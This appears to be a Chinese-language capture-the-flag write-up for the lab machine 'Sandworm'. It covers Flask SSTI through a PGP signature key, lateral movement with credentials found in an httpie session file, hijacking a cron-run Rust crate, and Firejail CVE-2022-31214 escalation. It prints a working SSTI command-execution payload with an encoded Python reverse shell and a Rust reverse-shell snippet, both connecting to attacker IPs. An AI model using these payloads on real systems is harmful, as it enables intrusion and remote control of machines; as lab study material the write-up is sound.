# Sandworm

Sandworm 是一台中等难度的 Linux 机器，它托管了一个具有“PGP”验证服务的 Web 应用程序，该服务容易受到服务器端模板注入 （SSTI） 的攻击，导致“Firejail”监狱内的远程代码执行 （RCE）。可以在监狱中发现明文凭据，这会导致作为计算机用户之一对计算机进行“SSH”访问。从那里，发现了一个 cronjob，它编译并运行一个“Rust”二进制文件。该程序依赖于一个自定义的外部日志记录箱，用户对该箱具有写入权限，然后使用该箱作为运行 cronjob 的“atlas”用户获取 shell。最后，最近的“Firejail”漏洞（“CVE-2022-31214”）用于创建一个沙盒，攻击者可以在其中运行“su”命令并在目标系统上获取“root”shell。

---

## 外部信息收集

### 端口扫描

循例nmap

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/bf130a03-9c8c-1d14-d38c-2036dc0b5196.png)

### Web枚举

访问80跳转到ssa.htb

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/1195219c-a2ac-d064-c551-e2f5934fca0e.png)

我看到网站底部有一个熟悉的flask

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/93d2de24-5f17-b12a-e57b-e7145df1391d.png)

在contact有一个表单，用于提交pgp加密的消息，它似乎会回复我们，接着看

在/guide是一个pgp加解密器

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/d92f6702-8335-d412-af36-1be530beb52e.png)

/pgp给了我们public key

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/d8b60969-44f9-6817-f56c-bbf777cfa1b4.png)

将公钥保存到本地

将公钥导入

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/a1267af4-0d9b-4e5b-d349-573c616dd929.png)

再用gpg利用公钥加密我们自定义的消息

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/f91652ca-3a7a-fada-48ca-46cf746b0e96.png)

已经知道是flask了，所以应该考虑ssti，通过decrypt尝试ssti发现不行

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/2c5558d5-da59-19c8-70e6-2b829a340919.png)

### SSTI

验证签名处，我们可以生成key然后使用公钥解密签名，在生成key的时候嵌入ssti payload

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/a157aa35-cefe-334c-132e-5069ad789e69.png)

然后再使用这个公钥对消息进行签名

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/36af49f2-b35f-e118-cd71-3f84e442b38b.png)

将公钥导出

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/ac946f0b-deaf-2462-5e3e-358f30409bc8.png)

将公钥和签名提交到网站

它payload成功被执行了

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/76312764-9e66-fbcd-6590-d3ae238cbe1a.png)

hacktricks随便来个ssti payload

	{{ cycler.__init__.__globals__.os.popen('id').read() }}


![file](https://blog.apt250.zip/wp-content/uploads/2023/12/2f414f11-585d-38d8-1beb-c89dd003c448.png)

来个python3 reverse shell payload，base64一下

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/c0e79bbd-af63-9e88-025e-6be6d209f186.png)

最终ssti payload

	{{ cycler.__init__.__globals__.os.popen('echo cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE0LjE4Iiw4ODg4KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO2ltcG9ydCBwdHk7IHB0eS5zcGF3bigiL2Jpbi9iYXNoIikn | base64 -d | bash').read() }}

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/95e04525-8916-71d0-7687-370f74ba4e37.png)

nc监听，它如期而至

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/b26316c2-4a7b-92d0-1e82-7092a8b867b3.png)

但这个shell似乎有点问题，无法回车，我们只需要升级一下这个shell

	ctrl + z
	stty raw -echo;fg

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/3186ab62-c17f-8938-6b4a-109a0a14fe20.png)

但这个shell是受限制的，能做的事情很有限

## 本地横向移动 -> silentobserver

在家目录的.config目录下的httpie/里面我们能够找到一个admin.json文件

	atlas@sandworm:~/.config/httpie/sessions/localhost_5000$ cat ./admin.json
	{
		"__meta__": {
			"about": "HTTPie session file",
			"help": "https://httpie.io/docs#sessions",
			"httpie": "2.6.0"
		},
		"auth": {
			"password": "quietLiketheWind22",
			"type": null,
			"username": "silentobserver"
		},
		"cookies": {
			"session": {
				"expires": null,
				"path": "/",
				"secure": false,
				"value": "eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIkludmFsaWQgY3JlZGVudGlhbHMuIl19XX0.Y-I86w.JbELpZIwyATpR58qg1MGJsd6FkA"
			}
		},
		"headers": {
			"Accept": "application/json, */*;q=0.5"
		}
	}

这组凭据能够直接登录ssh，同时拿到user flag

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/8bab5988-d553-7fb0-4b26-ae3ef95c5f74.png)

## 获得不受限制的shell -> atlas

传个pspy过去

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/ee143564-fcda-cc69-bb0c-113127f2e486.png)

	2023/12/21 08:26:01 CMD: UID=0     PID=3784   | /bin/sudo -u atlas /usr/bin/cargo run --offline 
	2023/12/21 08:26:01 CMD: UID=0     PID=3783   | /bin/sh -c cd /opt/tipnet && /bin/echo "e" | /bin/sudo -u atlas /usr/bin/cargo run --offline 
	2023/12/21 08:26:01 CMD: UID=1000  PID=3786   | /usr/bin/cargo run --offline 
	2023/12/21 08:26:01 CMD: UID=1000  PID=3787   | /usr/bin/cargo run --offline 
	2023/12/21 08:26:01 CMD: UID=1000  PID=3788   | rustc - --crate-name ___ --print=file-names --crate-type bin --crate-type rlib --crate-type dylib --crate-type cdylib --crate-type staticlib --crate-type proc-macro -Csplit-debuginfo=packed 
	2023/12/21 08:26:01 CMD: UID=1000  PID=3790   | rustc - --crate-name ___ --print=file-names --crate-type bin --crate-type rlib --crate-type dylib --crate-type cdylib --crate-type staticlib --crate-type proc-macro --print=sysroot --print=cfg 
	2023/12/21 08:26:01 CMD: UID=1000  PID=3792   | /usr/bin/cargo run --offline 
	2023/12/21 08:26:11 CMD: UID=0     PID=3796   | /bin/bash /root/Cleanup/clean_c.sh 
	2023/12/21 08:26:11 CMD: UID=0     PID=3797   | /bin/rm -r /opt/crates 
	2023/12/21 08:26:11 CMD: UID=0     PID=3798   | /bin/bash /root/Cleanup/clean_c.sh 
	2023/12/21 08:26:11 CMD: UID=0     PID=3799   | /usr/bin/chmod u+s /opt/tipnet/target/debug/tipnet 
	2023/12/21 08:28:01 CMD: UID=0     PID=3807   | /usr/sbin/CRON -f -P 
	2023/12/21 08:28:01 CMD: UID=0     PID=3806   | /usr/sbin/CRON -f -P 
	2023/12/21 08:28:01 CMD: UID=0     PID=3808   | /usr/sbin/CRON -f -P 
	2023/12/21 08:28:01 CMD: UID=0     PID=3809   | sleep 10 
	2023/12/21 08:28:01 CMD: UID=0     PID=3812   | /bin/sudo -u atlas /usr/bin/cargo run --offline 
	2023/12/21 08:28:01 CMD: UID=0     PID=3810   | /bin/sh -c cd /opt/tipnet && /bin/echo "e" | /bin/sudo -u atlas /usr/bin/cargo run --offline 
	2023/12/21 08:28:01 CMD: UID=0     PID=3813   | /bin/sudo -u atlas /usr/bin/cargo run --offline 
	2023/12/21 08:28:01 CMD: UID=1000  PID=3814   | rustc -vV 
	2023/12/21 08:28:01 CMD: UID=1000  PID=3815   | rustc - --crate-name ___ --print=file-names --crate-type bin --crate-type rlib --crate-type dylib --crate-type cdylib --crate-type staticlib --crate-type proc-macro -Csplit-debuginfo=packed 
	2023/12/21 08:28:01 CMD: UID=1000  PID=3817   | rustc - --crate-name ___ --print=file-names --crate-type bin --crate-type rlib --crate-type dylib --crate-type cdylib --crate-type staticlib --crate-type proc-macro --print=sysroot --print=cfg 
	2023/12/21 08:28:02 CMD: UID=1000  PID=3819   | rustc -vV 
	2023/12/21 08:28:11 CMD: UID=0     PID=3823   | /bin/bash /root/Cleanup/clean_c.sh 
	2023/12/21 08:28:11 CMD: UID=0     PID=3824   | 
	2023/12/21 08:28:11 CMD: UID=0     PID=3825   | /bin/bash /root/Cleanup/clean_c.sh 
	2023/12/21 08:28:11 CMD: UID=0     PID=3826   | /bin/bash /root/Cleanup/clean_c.sh 
	2023/12/21 08:30:01 CMD: UID=0     PID=3833   | /usr/sbin/CRON -f -P 

在/opt下我们可以找到它们

我们无权修改main.rs，但是通过cargo.toml发现它调用的logger模块是在/opt/crates下的

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/728d07fb-2150-b89e-ca51-412ab2a91417.png)

lib.rs可写

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/f7a9b707-5f06-74d3-ecbc-c8a4cd12add5.png)

将rust reverse shell payload拿下来改一改

	use std::net::TcpStream;
	use std::os::unix::io::{AsRawFd, FromRawFd};
	use std::process::{Command, Stdio};

	fn main() {
		let s = TcpStream::connect("10.0.0.1:4242").unwrap();
		let fd = s.as_raw_fd();
		Command::new("/bin/sh")
			.arg("-i")
			.stdin(unsafe { Stdio::from_raw_fd(fd) })
			.stdout(unsafe { Stdio::from_raw_fd(fd) })
			.stderr(unsafe { Stdio::from_raw_fd(fd) })
			.spawn()
			.unwrap()
			.wait()
			.unwrap();
	}

把shellcode改到lib.rs的log函数中，当main那边调用log函数时，我们的nc应该会收到shell

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/676717bd-18ad-f92b-d4ee-debbde510c5e.png)

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/ad0acd30-0d5a-9c63-cba8-7ed613efd1c6.png)

## 本地权限提升 - CVE-2022-31214

我们在atlas的不受限制的shell中发现了一个新的组，查找一下有关该组的目录和文件

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/a8443caa-851a-5a4f-3b58-66364acb4bfd.png)

### don't upgrade

升级一下shell

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/431e36dc-4846-2d9f-0eb8-fae455ec2a73.png)

**但是我发现使用pty之后，shell似乎又变得受限了，所以重新获取了一次shell**

可以看到firejail版本是0.9.68，并且还有root的suid

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/6fd446f4-0142-3301-600d-9791ded497c7.png)

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/ae51a06f-df41-f513-5399-4bd899ef7baa.png)

在谷歌搜索版本相关的漏洞能够找到一篇文章

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/fac8836f-1fd9-0c73-6f50-ac49f3e81904.png)

这个cve能够帮助我们利用其来进行权限提升，并且还提供了exp

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/125bdd1f-f74f-0e01-496f-6515df6d2a41.png)

先通过常规操作向atlas用户写入ssh key，然后通过ssh登录，签名的reverse shell先不要关

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/e66abaa9-fb1e-8332-8056-db85ee33f7b1.png)

运行exp

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/6b3a5dc3-8827-d39d-b5e3-8bf31b191419.png)

在另一个atlas的shell下执行firejail --join

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/86680135-0f82-2464-bd30-79b00c6dc5d1.png)

root flag在老地方
